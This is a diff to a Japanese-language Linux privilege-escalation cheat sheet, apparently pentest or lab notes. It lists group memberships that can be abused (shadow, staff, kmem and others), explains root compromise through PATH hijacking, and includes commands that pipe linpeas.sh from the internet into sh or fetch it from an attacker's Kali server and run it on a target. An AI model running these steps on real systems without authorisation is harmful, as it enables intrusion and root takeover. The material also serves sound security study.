@@ -33,8 +33,8 @@ uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(d
 | `shadow` | `/etc/shadow` の読み取り | ハッシュを取得してクラック |
 | `adm` | `/var/log/` の読み取り | ログからパスワード・セッション情報を探す |
 | `staff` | `/usr/local/bin`, `/usr/local/sbin` への書き込み | PATH ハイジャック → root が実行するスクリプトへの注入 |
-| `video` | フレームバッファ（画面）の読み取り | スクリーンショット取得 |
-| `kmem` | カーネルメモリの読み取り | カーネルレベルの情報漏洩 |
+| `video` | フレームバッファ（画面）の読み取り | スクリーンショット取得（※手法未記載） |
+| `kmem` | カーネルメモリの読み取り | カーネルレベルの情報漏洩（※手法未記載） |
 
 **`staff` グループが特に重要な理由：**
 `/usr/local/sbin` および `/usr/local/bin` は多くの Linux システムで `PATH` の最前列にある。root が `run-parts` や他のコマンドを**フルパスなしで実行する**スクリプト（PAM の MOTD 処理等）が動いている場合、この場所に同名のバイナリを置くだけで root として実行させられる。
@@ -227,6 +227,10 @@ rpm -qa 2>/dev/null | head -50
 ```bash
 # LinPEAS（最も網羅的）
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# ターゲットからインターネットに出られない場合（閉じたネットワーク）:
+# [Kali] python3 -m http.server 8000 でHTTPサーバーを起動し
+# [Target] wget http://[KALI_IP]:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+# → ファイル転送の詳細: Kernel_Exploits.md のファイル転送パターンを参照
 
 # LinEnum
 ./LinEnum.sh
